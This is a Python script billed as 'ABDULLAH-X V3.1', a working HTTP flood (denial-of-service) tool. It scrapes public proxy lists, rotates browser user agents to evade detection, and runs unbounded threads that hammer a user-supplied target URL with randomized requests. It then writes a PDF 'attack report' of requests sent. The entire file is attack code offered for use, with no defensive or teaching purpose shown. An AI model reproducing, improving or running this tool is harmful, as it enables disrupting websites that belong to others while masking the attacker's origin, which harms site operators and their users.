import requests
import random
import threading
import time
import re
import sys
from fpdf import FPDF
from datetime import datetime

# ====================================================================
# 🛡️ ABDULLAH-X V3.1 | DEVELOPED BY: MD ABDULLAH
# Features: Anti-Detection, Auto-Proxy, PDF Reporting
# ====================================================================

PROXY_SOURCES = [
    "https://api.proxyscrap.com/v2/?proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/rooster743/proxy-list/main/http.txt"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
]

class AbdullahXUltra:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.proxies = []
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = datetime.now()

    def scrape_proxies(self):
        print("[*] Scraping Proxies...")
        temp_proxies = []
        for source in PROXY_SOURCES:
            try:
                r = requests.get(source, timeout=10)
                found = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', r.text)
                temp_proxies.extend(found)
            except: continue
        self.proxies = list(set(temp_proxies))
        print(f"[+] Total Proxy Pool: {len(self.proxies)}")

    def generate_pdf_report(self):
        print("\n[*] Generating PDF Report...")
        end_time = datetime.now()
        duration = end_time - self.start_time
        
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        pdf.cell(200, 10, txt="ABDULLAH-X ATTACK REPORT", ln=True, align='C')
        pdf.set_font("Arial", size=12)
        pdf.ln(10)
        pdf.cell(200, 10, txt=f"Target URL: {self.target}", ln=True)
        pdf.cell(200, 10, txt=f"Attack Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
        pdf.cell(200, 10, txt=f"Attack Ended: {end_time.strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
        pdf.cell(200, 10, txt=f"Total Duration: {duration}", ln=True)
        pdf.ln(5)
        pdf.set_text_color(0, 128, 0)
        pdf.cell(200, 10, txt=f"Total Requests Sent: {self.request_count}", ln=True)
        pdf.set_text_color(255, 0, 0)
        pdf.cell(200, 10, txt=f"Failed Requests: {self.failed_count}", ln=True)
        
        file_name = f"attack_report_{int(time.time())}.pdf"
        pdf.output(file_name)
        print(f"[SUCCESS] Report saved as: {file_name}")

    def attack_engine(self):
        while True:
            proxy = random.choice(self.proxies)
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            try:
                with requests.Session() as session:
                    url = f"{self.target}?id={random.randint(1000, 9999)}"
                    headers = {'User-Agent': random.choice(USER_AGENTS), 'Referer': 'https://google.com'}
                    r = session.get(url, headers=headers, proxies=proxy_dict, timeout=5)
                    self.request_count += 1
                    if r.status_code == 200: self.success_count += 1
                    sys.stdout.write(f"\r[+] Requests: {self.request_count} | Status: {r.status_code}")
                    sys.stdout.flush()
            except:
                self.failed_count += 1
                pass

    def run(self):
        self.scrape_proxies()
        print(f"[*] Attacking {self.target} with {self.threads} threads...")
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_engine, daemon=True)
            t.start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            self.generate_pdf_report()
            print("[!] Stopped.")

if __name__ == "__main__":
    target = input("[?] Target URL: ")
    threads = int(input("[?] Threads: "))
    scanner = AbdullahXUltra(target, threads)
    scanner.run()
